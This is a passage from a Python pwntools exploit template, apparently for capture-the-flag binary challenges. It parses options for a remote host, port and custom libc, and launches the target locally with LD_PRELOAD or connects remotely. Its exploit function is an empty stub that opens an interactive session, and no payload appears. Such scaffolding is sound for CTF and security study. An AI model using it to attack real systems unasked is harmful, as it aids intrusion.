                port = sys.argv[i + 2]
            except:
                myExit("Problem with -r HOST PORT")
            log.debug("Enable remote connection to ", host, port)
            REMOTE = True
            i += 3

        elif opt == Mode.LIBC:
            try:
                libcVersion = sys.argv[i + 1]
            except:
                myExit("Problem with -l PathToLibC")

            log.debug("Set Library version to", libcVersion)
            # PATH_CUSTOM_GLIBC = PATH_GLIBC % libcVersion

            for file in listdir(PATH_LIBS):

                if file.startswith("ld") and libcVersion in file:
                    ldPath = path.join(PATH_LIBS, file)
                if file.startswith("libc") and libcVersion in file:
                    libcPath = path.join(PATH_LIBS, file)

            # libcPath = "/lib/x86_64-linux-gnu/libc-2.27.so"

            env = {"LD_PRELOAD": libcPath}

            libc = ELF(libcPath)
            i += 2

        else:
            myExit("Unknown option only -d -l -ld -r")

    if not libc:
        libc = elf.libc
    if REMOTE:
        r = remote(host, int(port))

    else:
        if ldPath is None:
            r = process(binary, env=env)
        else:
            r = process([ldPath, binary], env=env)
        if DEBUG:
            # Example
            # bp = [elf.sym["malloc"]]
            # bp = ["malloc"]

            debug(r, bp, elf)
    exploit(r, elf, libc)


def exploit(p, elf, libc):

    # Filled this function
    p.interactive()


if __name__ == "__main__":
    # Select context 32 or 64 bits
    set_context64()
    main()
```
